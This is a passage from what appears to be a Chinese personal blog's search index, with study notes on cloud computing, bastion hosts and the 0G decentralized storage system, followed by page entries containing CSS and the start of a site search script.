分布式存储（SDS）\n软件定义存储，通过多节点分布实现高扩展性和容错\n常见于云平台后端存储\n\n\n五、云平台管理功能\n弹性计算（自动扩容&#x2F;缩容）\n多区域管理\n裸金属管理\n多租户管理\n自助式服务\n全局监控\n\n\n六、云技术热点\n容器技术（比虚拟化更轻量，启动快、资源占用少）\n混合云应用\n超融合架构（计算+存储+网络一体化）\n\n\n问题解答\n云计算的基本概述、模式分类？\n概述：按需提供计算、存储、网络等资源，按使用付费。\n模式分类：横向（公有云、私有云、混合云），纵向（IaaS、PaaS、SaaS）。\n\n\n虚拟化技术解决什么问题？\n解决硬件与操作系统的紧耦合问题，实现资源池化、隔离与灵活调度。\n\n\n虚拟化平台包含哪些关键功能，各自的实验方案？\n功能：虚拟机创建&#x2F;管理、热迁移、快照、资源分配、网络虚拟化、存储虚拟化。\n实验方案：\n创建虚拟机实验\n虚拟机热迁移实验\n快照与回滚实验\n虚拟网络配置实验\n\n\n\n\n软件定义网络、网络功能虚拟化？\nSDN：集中管理、可编程的网络控制架构。\nNFV：将防火墙、负载均衡等网络功能虚拟化部署在通用服务器上。\n\n\n常见的存储类型有哪些？\n块存储、文件存储、对象存储。\n\n\n对 OpenStack 的理解？\n开源云平台管理软件，支持IaaS功能，模块化（Nova计算、Neutron网络、Cinder块存储等）。\n\n\nPaaS 平台在企业中的现实问题？\n厂商锁定、迁移成本高、兼容性问题、平台稳定性要求高。\n\n\n混合云有哪些应用场景，哪些场景最广泛？\n场景：核心业务私有云、突发负载上公有云、灾备方案。\n最广泛：混合部署实现弹性扩容。\n\n\n超融合是什么？优缺点？\n定义：计算、存储、网络三合一架构。\n优点：部署快、运维简单、成本可控。\n缺点：扩展粒度受限、性能受节点瓶颈影响。\n\n\n云平台和虚拟化的区别？\n虚拟化：资源层面的技术实现。\n云平台：在虚拟化之上提供管理、调度、自动化、计费等功能。\n\n\n云平台的典型功能？\n弹性计算、多区域、多租户、裸金属管理、自助服务、全局监控。\n\n\nCMP 是干啥的？\nCMP（Cloud Management Platform）：云管理平台，用于统一管理多云&#x2F;混合云环境的资源、权限、计费和监控。\n\n\n\n","url":"2025/08/08/云计算学习笔记/","date":"2025-08-08"},{"title":"什么是堡垒机","content":"堡垒机学习笔记1. 产品定位\n定义：堡垒机是一种运维审计系统，核心是可控与可审计。\n作用：作为跳板访问敏感数据与资产，实现安全的集中运维管理。\n典型客户：金融机构、企业、政府部门。\n\n\n\n2. 解决的痛点\n身份不明，授权不清 → 统一身份管理与权限分配\n操作不透明 → 实时记录运维行为\n结果难审计 → 提供可回溯的操作日志与录像\n\n\n3. 设计理念（4A 模型）\n事前认证：确认身份（Authentication）\n事前授权：分配权限（Authorization）\n事中运维：安全控制访问（Access）\n事后审计：全程可回放（Audit）\n\n\n4. 产品实力4.1 重点能力\n协议代理（SSH、RDP、FTP等）\n运维方式（集中化、可控化）\n认证方式（多因素认证、本地认证、对接第三方认证系统）\n审计溯源（录像、命令审计、文件传输审计）\n\n4.2 资产全生命周期管理\n资产巡检\n账号巡检\n混合云管理\n密码管理\n\n\n5. 安恒堡垒机的优势能力\nLinux命令控制\n数据库命令控制\n文件传输控制\n访问控制\n\n\n6. 相关技术概念\nAPI：应用程序接口，不同软件系统之间交互的协议与工具\n热备份：逻辑切换，主机故障时自动切换到备用机\n冷备份：物理切换，需要人工介入切换\n\n\n7. 部署方式\n异地灾备部署\n多地部署，异地自动同步配置\n不受网络带宽影响，同时具备灾备功能\n\n\n8. 引用什么是堡垒机？为什么需要堡垒机？ - CSDN App\n","url":"2025/07/21/堡垒机学习笔记/","date":"2025-07-21"},{"title":"0G核心模块|存储架构设计与实现","content":"主要内容\n0G Storage 模块功能介绍与工作流程\n数据可验证存储 (Proof of Random Access) 机制\nSDK 安装与使用教程 (上传&#x2F;下载)\n去中心化数据存储场景中的实际部署方案\n\n\n一. 数据存储相关原课件：\nCurrent storage options force impossible tradeoffs:Cloud providers: Fast but expensive with vendor lock-inDistributed options: Either slow (IPFS)Decentralized: Or limited (Filecoin), or prohibitively expensive (Arweave)\n笔记：\n当前常见的数据存储方式及问题云服务商（Cloud providers，比如 AWS、Google Cloud、阿里云）  \n\n优点：速度快，使用方便。  \n缺点：价格很贵，而且容易被厂商“绑架”（vendor lock-in，意思是你用了他们的服务后，迁移到别的地方会很麻烦）。\n\n分布式存储（Distributed options，比如 IPFS）  \n\n优点：去中心化，理论上不依赖单一公司。  \n缺点：速度很慢，实际体验差。\n\n去中心化存储（Decentralized storage，比如 Filecoin、Arweave）  \n\nFilecoin：功能有限，应用场景不够灵活。  \nArweave：存储费用非常高，很多项目承担不起。\n\n\n二. 0G 的系统设计（0G 如何设计以解决上述问题）原课件：\nLog Layer (Immutable Storage)  \n\nFor AI training data, archives, backups  \nAppend-only (write once, read many)  \nOptimized for large files  \nLower cost for permanent storage\n\nKey-Value Layer (Mutable Storage)  \n\nFor databases, dynamic content, state storage  \nUpdate existing data  \nFast key-based retrieval  \nReal-time applications\n\n\n笔记：\n0G 通过设计两层存储结构来兼顾速度和成本：\nLog Layer（不可变存储）  \n\n主要用于 AI 训练数据、档案、备份  \n只允许追加写入（写一次，多次读取）  \n针对大文件进行了优化  \n适合长期存储，成本较低\n\nKey-Value Layer（可变存储）  \n\n用于数据库、动态内容、状态存储  \n可以更新已有数据  \n支持基于键的快速检索  \n适合实时应用\n\n在不可变存储（Log Layer）中，适合存放训练数据、档案和备份。这里采用“写一次，多次读”的方式，优化了大文件的存储效率，同时降低长期存储的成本。  \n在可变存储（Key-Value Layer）中，支持数据库、动态内容和实时应用。这里允许数据更新，并提供快速的键值检索能力，从而满足实时性要求。  \n通过这种分层方式，0G 既能保证速度和低成本，又避免了传统云的厂商锁定问题，也比 IPFS、Filecoin、Arweave 更灵活和实用。  \n日志上链有先后顺序\n\n在 0G 的 Log Layer（不可变存储） 中，数据是以“追加写入”的方式存储的。\n每条日志都有时间顺序或顺序编号（类似区块链的区块顺序），保证写入的顺序不可篡改。\n这样即使数据量很大，也能通过顺序索引快速找到最新的数据或某个历史数据点。\n\n天然的回滚机制\n\n因为日志是按顺序追加的，如果出现错误或需要恢复到某个历史状态，只需回到某条日志之前的状态即可。\n不像传统数据库可能需要复杂的事务和回滚操作，日志的顺序本身就天然提供了恢复历史状态的能力。\n\n存储数据流程图：\n\n\n Log Layer 的顺序写入不仅保证了数据不可篡改，还可以天然支持回滚历史状态，非常适合 AI 数据、备份等长期存储场景。\n\n回滚流程图：\n\n三. 实际数据上传设计\n原课件:\nData Publishing Lane\n\nHandles metadata and availability proofs\n\nVerified through 0G Consensus network\n\nEnables fast data discovery\n\n\nData Storage Lane\n\nManages actual data storage\n\nUses erasure coding: splits data into chunks with redundancy2.1   Even if 30% of nodes fail, data remains accessible\n\nAutomatic replication\n\n\n笔记：\nPublishing Lane：负责“证明”和“发现”，保证别人能找到并信任你的数据。\nStorage Lane：负责“存储”和“冗余”，保证你的数据长期可用，即使部分节点失效也不会丢失。\n数据上传流程第一步：数据发布 (Data Publishing Lane)\n\n当用户上传数据时，系统会先处理 元数据（metadata），并生成 可用性证明（availability proofs）。\n这些证明会提交到 0G 共识网络，用来确保上传的数据是真实存在的，而不是虚假信息。\n通过这个过程，网络中其他节点能够 快速发现和验证数据。\n\n第二步：数据存储 (Data Storage Lane)\n\n真正的文件内容会进入存储通道。\n系统会对数据进行 纠删码（erasure coding） 处理：\n把文件切分成多个小块，并增加冗余。\n即使有 30% 的存储节点宕机，数据依然可以完整恢复。\n\n\n这些数据块会被 自动复制 并分布式存储在不同节点上，从而保证数据的高可用性和容错性。\n\n上传数据流程图：\n\n四. 分片存储设计原课件：\nSharded Storage -Naturally suited for parallel computing\n\n2 ^k\n\nm independent storage nodes (non overlapping in stored data)\n\nn clients, only uploading to certain nodes based on the shard config\n\nHorizontally scalable m x bandwidth\n\n\n笔记：\nSharded Storage（分片存储）设计说明\n2^k 分片\n数据被划分为 2k2^k2k 个分片，每个分片都有独立编号。\n这样可以更精细地分布数据，提高并行处理能力。\n\n\nm 个独立存储节点\n每个节点存储的数据 不重叠，保证数据均匀分布。\n节点之间互不干扰，提高效率和容错性。\n\n\nn 个客户端上传数据\n客户端根据 分片配置（shard config），只上传到特定的节点。\n避免所有客户端都上传到同一节点，减少瓶颈。\n\n\n水平扩展能力\n可以通过增加更多节点来提升系统容量和吞吐量。\n理论上带宽可以达到 m × 单节点带宽，实现线性扩展。\n\n\n\n分片存储策略流程图：\n\n\n客户端根据 shard 配置上传数据，只上传到特定分片。\n分片再映射到独立存储节点，节点之间数据不重叠。\n新增节点可以水平扩展系统容量，带宽几乎线性增加。\n\n带宽的计算1. 单节点带宽每个存储节点都有自己的网络带宽，例如 B Mbps。 节点处理自己存储的分片时，可以利用这个带宽进行上传&#x2F;下载。\n2. 分片与节点\n数据被划分为 2^k 个分片\n分片分布在 m 个节点 上（通常 2k≥m2^k \\ge m2k≥m），每个节点可能存储多个分片\n客户端上传数据时，每个分片的数据只能上传到对应节点\n\n3. 水平可扩展带宽\n如果节点数量增加，系统总带宽大约线性增加\n理论上，存储网络总带宽 ≈ 节点数量 × 单节点带宽\n不是分片数量 × 单分片带宽，因为分片可能集中在少量节点上\n\n总结\n分片数量决定了并行处理能力\n节点数量决定了系统整体带宽\n理论上，增加节点可以线性扩展总带宽\n增加分片只是提升并行度，不直接增加总带宽\n\n\n0G Storage为何要使得数据以2^k 对齐(全选)\n\nA.方便链上与存储网络数据对齐\nB.方便链上交易构造\nC.方便用户上传、下载时数据定位\nD.方便分片对齐\n\n\n节点、分片和带宽关系的示意图\n五.Flow + Merkle Tree over Flow原课件：\nFlow\n\nThe underlying structure of storage\n\nContinuously appended list of sectors\n\n\nMerkle Tree over Flow\n\nMerkle Root\n\n​\t\tSpeacially desighed,2^k\n\nSubmissionSeveral concatenated sector arrays    Each length with power of two    Strictly decrease    First length &lt;&#x3D; 8 x Last length\n\nMetadataSize of original data (bytes)Merkle root and length of each array\n\nSubmission is always composed of several Merkle trees over the subtreeswithin the Flow, providing the Merkle root.\n\nThe user’s submission will not be excessively long\n\n\n笔记：\n用连续追加的扇区列表作为底层存储，用 Merkle Tree 叠加验证数据完整性，同时通过长度递减的扇区数组保证提交数据高效且安全。\n结构体示意：\n\nFlow（底层存储结构）\n\n数据存储为 连续追加的扇区列表（sectors），类似日志追加的方式。\n保证写入顺序不可篡改，也方便回溯历史数据。\n\nFlow 上的 Merkle Tree\n\n每个提交的数据会生成一个 Merkle 根（Merkle Root），用于验证数据完整性。\n特别设计成 2^k 的长度，方便计算和验证。\n\n提交数据（Submission）\n\n一个提交由 多个连接的扇区数组 组成。\n每个数组的长度是 2 的幂次方，并且 严格递减，第一个数组长度 ≤ 最后一个数组长度的 8 倍。\n这样可以保证数据分片有规律，方便验证和存储优化。\n\n元数据（Metadata）\n\n包括原始数据大小（字节）、每个数组的长度、以及 Merkle 根。\n用于快速验证数据完整性和定位数据位置。\n\nMerkle Tree 的作用\n\n每次提交的数据都会在 Flow 上形成 若干子树的 Merkle Tree，再由这些子树生成最终 Merkle 根。\n这样用户提交的数据既不会太长，也能高效验证完整性。\n\n示意图：\n\n六. PoRA _0G 的存储安全性和访问验证机制原课件：\nWhat if a node does not store the data but only query others’ when needed?Data Sealing        Designed to be more expensive than simply storing therdata\n12sealed[0] = unsealed[e] ^ keccak256(minerId, contextDigest,index)sealed[i] = unsealed[i] ^ keccak256(sealedi-1])\n\n​\tSequential sealing and parallel unsealing\nUnique consensus mechanism known as Proof of Random Access (PoRA)\n\nRandom Challenges: System randomly asks miners to prove they have specific data\nCryptographic Proof: Miners must generate a valid hash (like Bitcoin mining)\nQuick Response: Must respond fast to prove data is readily accessible\nFair Rewards: Successful proofs earn storage fees\nNot always working, release mining context by contract periodically\nUnbounded by target submission count for each context\n\nRecall Range    Determined by\n\nOnchain seeds\n\nIndex of start sector——————–Miner Defined\n\nMining length\n\n\nDifficulty Adjustment   Pora target, the higher the easier\n123expectedPoraTarget = poraTarget * actualBlocks /TARGET BLOCKSporaTarget += (expectedPoraTarget -poraTarget) / ADJUST RATIO\n\n\n\n笔记：\n1. 数据封装（Data Sealing）\n设计目的：比简单存储数据更昂贵，确保节点不能只“懒惰”地不存数据，只在需要时查询别人的数据。\n\n封装方式：\n12sealed[0] = unsealed[e] ^ keccak256(minerId, contextDigest,index)sealed[i] = unsealed[i] ^ keccak256(sealedi-1])\n\n\n\n逻辑：\n\n数据是 顺序封装（sequential sealing），保证每块数据依赖前一块。\n解封（unsealing）可以 并行进行，方便验证。\n\n\n\n\n2. Proof of Random Access (PoRA)核心思想：随机挑战存储节点，确保它们真正存储了数据，而不是仅仅查询别人。\n\nRandom Challenges：系统随机要求节点证明它们拥有某块数据\nCryptographic Proof：节点必须生成有效的哈希证明（类似比特币挖矿）\nQuick Response：节点必须快速响应，证明数据随时可访问\nFair Rewards：成功证明的节点获得存储费用奖励\nPeriodic Mining Context：验证不是一直进行，而是周期性释放上下文\nUnbounded Target：每个上下文的目标提交次数不固定\n\n\n3. Recall Range（回溯范围）\n确定依据：\n链上随机种子（Onchain seeds）\n起始扇区索引（Miner Defined）\n挖矿长度（Mining length）\n\n\n作用：规定节点需要证明哪些数据块可访问，增加随机性和安全性\n\n\n4. Difficulty Adjustment（难度调整）\n目标：保证 PoRA 证明的难度适中，既不能太容易，也不能太难。\n\n公式：\n123expectedPoraTarget = poraTarget * actualBlocks /TARGET BLOCKSporaTarget += (expectedPoraTarget -poraTarget) / ADJUST RATIO\n\n\n\n逻辑：根据实际区块产出情况动态调整 PoRA 难度\n\n\n\n总结这个系统设计 确保节点不能偷懒或作弊：\n\n通过 Data Sealing，存储成本高、依赖顺序\n通过 PoRA 随机挑战，验证节点随时可访问数据\n通过 Recall Range 和 Difficulty Adjustment，保证系统安全、公平、可扩展\n\n\n\n1. 初始存储位置在 Flow 的哪里？\n用户上传的数据 先存储在 Flow 的底层结构（Flow 底层扇区列表）。\nFlow 是一个 连续追加的扇区列表（Append-only sectors），保证写入顺序不可篡改。\n数据在 Flow 中被划分成 多个扇区数组（数组长度为 2 的幂次方，严格递减），每个数组会生成 子树 Merkle Tree，最终形成整个提交的 Merkle 根。\n总结：初始存储在 Flow 的 连续扇区 + 扇区数组 + 子树 Merkle Tree 结构里。\n\n\n2. 挖矿有难度调整，什么越高越简单？\n在 0G 的 PoRA 挖矿中，系统会根据实际出块情况 动态调整难度（Difficulty Adjustment）：\n12expectedPoraTarget = poraTarget * actualBlocks / TARGET_BLOCKSporaTarget += (expectedPoraTarget - poraTarget) / ADJUST_RATIO\n\nporaTarget 越高 → 难度越低 → 挖矿越简单\n\n逻辑：如果系统发现节点太难完成挑战，就提高 poraTarget，让挑战更容易；如果太容易，就降低 poraTarget，让挑战更难。\n\n\n\n3. 只挖一部分指的是什么？\n节点并不是必须验证或提交全部存储数据，而是 随机挑战下只证明部分数据的可访问性。\n这对应 PoRA 的随机抽查机制（Random Challenges）：\n系统随机抽取存储的某些扇区，节点需要快速生成加密证明。\n节点只验证这一部分数据，不必全部扫描，提高效率。\n\n\n总结：只挖一部分 &#x3D; 节点只针对被系统随机抽取的数据块进行挖矿&#x2F;证明，而不是整份存储数据。\n\n\n4. 0G Storage 的挖矿机制里，每次挖矿数据(Recal Range)由什么因素确定(多选)  A.链上种子  B.用户存储起始位置  C.用户设置区间长度  D.网络框架规定的区间限制\n全选\n七. 奖励机制Fair Competition &#x3D; Fair RewardTo promote fairness, the mining range is capped at 8 TB of data per mining operation\n​\tSmall miners can compete with large operations​\tPrevents centralization​\tLower barrier to entry​\tMove onto next data chunk if the current is fully mined (no more rewards)\n​\tFor large operators: Run multiple 8TB instances.For \tindividuals: Focus on single 8TB range, still profitable\nPricing    sector_price x  xReward Bucket    capped at 8TB    Linear releaseSystem Reward\n​\t0G issuing\n​\tBase reward for each PoRA, for early contributorsService Fee​\tCharged by 0G​\tProportion of storage fee\n笔记：\n1. 公平竞争（Fair Competition）\n目的：让小矿工也能和大矿场公平竞争，防止中心化。\n做法：\n每次挖矿操作的 数据范围上限为 8TB。\n小矿工可以专注单个 8TB 数据块，大矿工可以同时运行多个 8TB 实例。\n如果当前数据块已挖完（奖励用完），就移动到下一个数据块。\n\n\n好处：\n降低进入门槛，小矿工也能参与。\n避免大矿工垄断整个网络。\n系统资源分配更均衡。\n\n\n\n\n2. 奖励机制（Reward）\nSector 奖励：每个扇区根据 sector_price × 扇区数量 计算奖励。\n奖励池（Reward Bucket）：\n每次挖矿的数据范围上限 8TB\n奖励 线性释放，挖多少算多少\n\n\n系统奖励（System Reward）：\n由 0G 发放\n包括 PoRA 挖矿的基础奖励\n鼓励早期贡献者\n\n\n服务费（Service Fee）：\n由 0G 收取\n按存储费用的一定比例抽取\n\n\n\n\n3. 总结\n公平竞争 + 奖励上限：防止大矿工垄断，让小矿工也能赚到奖励。\n定价 + 奖励机制：结合扇区数量、PoRA 挑战和服务费，实现经济激励和网络可持续运行。\n机制灵活性：大矿工可以多实例操作，小矿工集中单个数据块，也都能盈利。\n\n八. 实现原课件：\nCore Components\n\n0G Storage Node (For node runners)\n\n0G Staraae Contracts (For data upload tx, mining check and reward)\n\n0G Starage Client -Golang (For user uploaddownload operations)\n\n0G Starage Ts SDK -TS\n\n\nRPC supported\n\nGateway\n\nJSON RPC\n\ngRPC (Faster with less data overhead)\n\nTested with 2GB&#x2F;s Upload&#x2F;Download speed with 32 storage nodes (32 shards)\n\n\n笔记：\n\n1. 核心组件（Core Components）\n0G Storage Node：运行存储节点的程序，负责存储数据和响应 PoRA 挑战。\n0G Storage Contracts：链上智能合约，处理上传交易、挖矿验证和奖励发放。\n0G Storage Client - Golang：用户端工具，用于上传和下载数据。\n0G Storage TS SDK - TypeScript：提供给前端或 JS&#x2F;TS 项目使用的 SDK。\n\n\n2. 支持的 RPC 协议\nGateway：网关接口，方便客户端访问存储网络。\nJSON RPC：通用的远程调用接口。\ngRPC：高性能远程调用，数据开销更小。\n性能测试：32 个分片节点情况下，上传&#x2F;下载速度可达 2GB&#x2F;s。\n\n\n3. 数据上传&#x2F;下载流程\n发送请求给 index\n用户客户端先向索引服务（index）发请求，获取存储节点信息和分片配置。\n\n\n选择相近节点进行上传&#x2F;下载\n根据网络拓扑或节点距离（latency）选择合适节点，提高传输效率。\n\n\n链上同步交易\n上传操作会同步到智能合约上，记录交易信息、存储证明等。\n\n\n与同步到的节点传输数据\n客户端与选定节点之间直接传输数据，支持广播或请求方式上传&#x2F;下载。\n\n\n\n\n\n\n\n0G 的存储系统通过 节点 + 合约 + 客户端 + SDK 构成完整生态。\n上传下载是 客户端 -&gt; 索引 -&gt; 节点 -&gt; 链上同步 -&gt; 节点间传输 的流程。\n支持高性能 RPC，保证分片并行传输和大文件高吞吐。\n\n\n特别的参数举例\nProvider either indexer or node list\n\n\nNode list needs to cover the enti’e shards\n\nOr indexer will do it for you\n\nSkip tx if you paid already but try to re-upload\nDefault fee is for 3 months\nstorage(minimum),set higher to store longer\nThe large file will be fragmented to 4GB each.will receive a list of data roots for retrieval\n\nUsage:0g storagc clicnt uploadFlags\n–cxpected-replica uint   expccted number of replications to upload (defauit 1)–fee float   fee paid in a0gi–file string   File name to upload–finality-required   Wait for file finality on  nodes to upload–fragment-size int   the size of fragment to split into when file is too large (default 429–grpe node strings   ZeroGStorage storage nade gRPC URL-h,–help  help for upload–indexer string   ZeroGStorage indexer URL–key string   Private key to interact with smart contract–max-gas-price uint    max gas price to send transaction–method string   method for selecting nodes, can be max, min, random, or positive will fail if the reguirement cannot be met (default “min”)–n-retries int   number of retries for uploading whan it’s not gas price issue–node strings   ZergGStorage storage node URL–nonce uint     nonce of upload transaction–routines int–skip-tx     Skip sending the transaction on chain if already exists (default true)\n…\n\n\n补充什么是并行计算\n并行计算（Parallel Computing）就是 把一个大的计算任务分成很多小任务，同时由多个处理单元（CPU、GPU 或节点）一起处理。\n目标是 加快计算速度，提高效率，而不是一个一个顺序执行。\n\n\n并行计算是怎么工作的\n任务分解（Task Decomposition）\n将大任务拆成多个小子任务。\n这些子任务尽量互相独立，避免互相等待。\n\n\n分配到处理单元（Task Scheduling）\n小任务被分配到不同的处理单元（CPU 核心、GPU 核心、节点等）。\n每个处理单元同时运行一个或多个小任务。\n\n\n独立执行（Independent Execution）\n各个处理单元同时进行计算。\n在 0G 的分片存储场景中，比如不同分片的数据可以在不同节点上同时存储和检索。\n\n\n结果合并（Result Aggregation）\n小任务完成后，把结果汇总成最终结果。\n确保计算正确性和完整性。\n\n\n\n举例假设你要计算 1000 个数字的平方和：\n\n顺序计算：一个数字算一个数字 → 总时间长。\n并行计算：把 1000 个数字分成 10 组，每组 100 个数字交给 10 个 CPU 核心同时计算 → 大幅减少总时间。\n\n\n在 0G 存储中的应用\n数据被 分片（Sharding） → 每个分片可以在不同节点上并行处理上传、存储、检索。\n并行计算提高了 上传速度、数据处理能力和吞吐量，让系统可以支持大量用户同时操作。\n\n","url":"2025/08/25/0G 第三课学习笔记/","date":"2025-08-25"}],"pages":[{"title":"友情链接","content":"欢迎互换友链！\n/* 基础容器样式 */\n.link-container {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(210px, 1fr)); /* 卡片宽度缩小 */\n  gap: 20px;\n  padding: 20px 0;\n}\n/* 卡片主体 - 3:4比例 */\n.link-card {\n  background: white;\n  border-radius: 12px;\n  overflow: hidden;\n  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);\n  transition: all 0.3s ease;\n  border: 1px solid rgba(0, 0, 0, 0.05);\n  aspect-ratio: 3/4; /* 关键：强制3:4比例 */\n  display: flex;\n  flex-direction: column;\n}\n\n/* 图片容器 - 保持1:1比例 */\n.link-image-container {\n  width: 100%;\n  aspect-ratio: 1/1; /* 1:1正方形 */\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  background: #f8f8f8;\n  overflow: hidden;\n}\n\n/* 图片样式 - 完整显示1:1图片 */\n.link-card img {\n  width: auto;\n  height: 100%;\n  max-width: 100%;\n  object-fit: contain; /* 关键：完整显示不裁剪 */\n}\n\n/* 信息区域 - 自动填充剩余空间 */\n.link-info {\n  padding: 15px;\n  flex-grow: 1;\n  display: flex;\n  flex-direction: column;\n  justify-content: center;\n}\n\n/* 其他样式保持不变 */\n.link-info h3 {\n  margin: 0 0 8px 0;\n  font-size: 1.1em;\n  text-align: center;\n}\n\n.link-info h3 a {\n  color: #2c3e50;\n  text-decoration: none;\n  transition: color 0.2s;\n}\n\n.link-info h3 a:hover {\n  color: #42b983;\n}\n\n.link-info p {\n  margin: 0;\n  color: #7f8c8d;\n  font-size: 0.9em;\n  line-height: 1.5;\n  text-align: center;\n}\n\n/* 响应式调整 */\n@media (max-width: 600px) {\n  .link-container {\n    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));\n  }\n}\n\n\n\n  \n    \n      \n    \n    \n      吉伊\n      小八的好友\n    \n  \n\n  \n    \n      \n    \n    \n      乌萨奇的主页\n      小八的好友\n    \n  \n","url":"link/index.html","date":"2025-08-04"},{"title":"我的收藏","content":"我的收藏这里是我推荐的内容或个人收藏，可以随时更新。  \n","url":"star/index.html","date":"2025-08-04"},{"title":"","content":"\n\n\n    \n    \n    Eightjiu\n    \n        * {\n          margin: 0;\n          padding: 0;\n          box-sizing: border-box;\n        }\n\n        body {\n          font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, sans-serif;\n          background: linear-gradient(135deg, #87ceeb 0%, #b0e0e6 50%, #e0f6ff 100%);\n          min-height: 100vh;\n          display: flex;\n          flex-direction: column;\n          color: #333;\n        }\n\n        /* Header */\n        .header {\n          padding: 15px 20px;\n        }\n\n        .nav {\n          display: flex;\n          justify-content: flex-end;\n          align-items: center;\n          gap: 15px;\n        }\n\n        .nav-link {\n          color: #2c5282;\n          text-decoration: none;\n          font-size: 14px;\n          padding: 8px 12px;\n          border-radius: 4px;\n          transition: background-color 0.2s;\n        }\n\n        .nav-link:hover {\n          background-color: rgba(255, 255, 255, 0.3);\n        }\n\n        .profile-btn {\n          background: none;\n          border: none;\n          color: #2c5282;\n          cursor: pointer;\n          padding: 8px;\n          border-radius: 50%;\n          transition: background-color 0.2s;\n        }\n\n        .profile-btn:hover {\n          background-color: rgba(255, 255, 255, 0.3);\n        }\n\n        /* Main Content */\n        .main {\n          flex: 1;\n          display: flex;\n          flex-direction: column;\n          align-items: center;\n          justify-content: center;\n          padding: 20px;\n          margin-top: -80px;\n        }\n\n        .logo-container {\n          margin-bottom: 35px;\n        }\n\n        .logo {\n          font-size: 90px;\n          font-weight: 400;\n          color: #1e40af;\n          text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);\n          letter-spacing: -2px;\n        }\n\n        /* Search Container */\n        .search-container {\n          width: 100%;\n          max-width: 584px;\n          margin-bottom: 35px;\n        }\n\n        .search-box {\n          position: relative;\n          display: flex;\n          align-items: center;\n          background: white;\n          border: 2px solid #4a90e2;\n          border-radius: 24px;\n          padding: 0 16px;\n          height: 48px;\n          box-shadow: 0 4px 12px rgba(74, 144, 226, 0.2);\n          transition: all 0.3s ease;\n        }\n\n        .search-box:hover {\n          box-shadow: 0 6px 16px rgba(74, 144, 226, 0.3);\n          border-color: #357abd;\n        }\n\n        .search-box:focus-within {\n          box-shadow: 0 6px 16px rgba(74, 144, 226, 0.4);\n          border-color: #2563eb;\n        }\n\n        .search-icon {\n          color: #6b7280;\n          margin-right: 12px;\n          flex-shrink: 0;\n        }\n\n        .search-input {\n          flex: 1;\n          border: none;\n          outline: none;\n          font-size: 16px;\n          color: #333;\n          background: transparent;\n        }\n\n        .search-input::placeholder {\n          color: #9ca3af;\n        }\n\n        .voice-search,\n        .camera-search {\n          background: none;\n          border: none;\n          color: #4a90e2;\n          cursor: pointer;\n          padding: 8px;\n          margin-left: 8px;\n          border-radius: 4px;\n          transition: background-color 0.2s;\n        }\n\n        .voice-search:hover,\n        .camera-search:hover {\n          background-color: #f3f4f6;\n        }\n\n        .search-buttons {\n          display: flex;\n          justify-content: center;\n          gap: 14px;\n          margin-top: 30px;\n        }\n\n        .search-btn {\n          background: white;\n          border: 1px solid #4a90e2;\n          color: #2563eb;\n          padding: 10px 20px;\n          border-radius: 6px;\n          font-size: 14px;\n          cursor: pointer;\n          transition: all 0.2s;\n          box-shadow: 0 2px 4px rgba(74, 144, 226, 0.1);\n        }\n\n        .search-btn:hover {\n          background: #f0f8ff;\n          border-color: #357abd;\n          box-shadow: 0 4px 8px rgba(74, 144, 226, 0.2);\n        }\n\n        /* 清空按钮样式 */\n        .clear-search {\n          background: none;\n          border: none;\n          color: #6b7280;\n          cursor: pointer;\n          padding: 8px;\n          margin-left: 4px;\n          border-radius: 4px;\n          transition: all 0.2s;\n        }\n\n        .clear-search:hover {\n          background-color: #f3f4f6;\n          color: #4a90e2;\n        }\n\n        /* 搜索结果容器 */\n        .search-results {\n          width: 100%;\n          max-width: 584px;\n          margin-top: 20px;\n          background: white;\n          border-radius: 12px;\n          box-shadow: 0 4px 12px rgba(74, 144, 226, 0.15);\n          max-height: 400px;\n          overflow-y: auto;\n          display: none;\n        }\n\n        .search-results:not(:empty) {\n          display: block;\n          padding: 16px 0;\n        }\n\n        /* 搜索结果项 */\n        .search-item {\n          padding: 12px 20px;\n          border-bottom: 1px solid #f1f5f9;\n          transition: background-color 0.2s;\n        }\n\n        .search-item:last-child {\n          border-bottom: none;\n        }\n\n        .search-item:hover {\n          background-color: #f8fafc;\n        }\n\n        .search-item h3 {\n          margin: 0;\n          font-size: 16px;\n          font-weight: 500;\n          line-height: 1.4;\n        }\n\n        .search-item a {\n          color: #2563eb;\n          text-decoration: none;\n          transition: color 0.2s;\n        }\n\n        .search-item a:hover {\n          color: #1d4ed8;\n          text-decoration: underline;\n        }\n\n        /* 搜索关键词高亮 */\n        .search-keyword {\n          padding: 2px 4px;\n          border-radius: 3px;\n          font-weight: 600;\n          color: #1f2937;\n        }\n\n        /* 无结果提示 */\n        .search-results p {\n          text-align: center;\n          color: #64748b;\n          font-size: 14px;\n          padding: 20px;\n          margin: 0;\n        }\n\n        /* 搜索结果滚动条样式 */\n        .search-results::-webkit-scrollbar {\n          width: 6px;\n        }\n\n        .search-results::-webkit-scrollbar-track {\n          background: #f1f5f9;\n          border-radius: 3px;\n        }\n\n        .search-results::-webkit-scrollbar-thumb {\n          background: #cbd5e1;\n          border-radius: 3px;\n        }\n\n        .search-results::-webkit-scrollbar-thumb:hover {\n          background: #94a3b8;\n        }\n\n        /* Responsive Design */\n        @media (max-width: 768px) {\n          .logo {\n            font-size: 60px;\n          }\n\n          .search-container {\n            max-width: 90%;\n          }\n        }\n\n        @media (max-width: 480px) {\n          .logo {\n            font-size: 48px;\n          }\n\n          .search-buttons {\n            flex-direction: column;\n            align-items: center;\n          }\n\n          .search-btn {\n            width: 200px;\n          }\n        }\n    \n\n\n    \n        \n            \n                \n                    \n                        \n                    \n                \n            \n        \n    \n\n    \n        \n            Eightjiu\n        \n\n        \n            \n                \n                    \n                        \n                        \n                    \n                    \n                    \n                        \n                            \n                        \n                    \n                \n            \n\n            \n            \n            \n        \n    \n\n    \n        ;(() => {\n          const input = document.getElementById(\"local-search-input\")\n          const resultContainer = document.getElementById(\"local-search-result\")\n          const clearBtn = document.getElementById(\"search-clear-btn\")\n          const searchPath = \"/search.xml\"\n          let searchData = []\n\n          // 天蓝色主题的高亮颜色\n          const colors = [\"#87ceeb\", \"#4a90e2\", \"#5dade2\", \"#85c1e9\", \"#aed6f1\"]\n          const randomColor = () => colors[Math.floor(Math.random() * colors.length)]\n\n          // 高亮匹配词\n          const highlight = (text, keyword) => {\n            const regex = new RegExp(`(${keyword})`, \"gi\")\n            return text.replace(regex, `$1`)\n          }\n\n          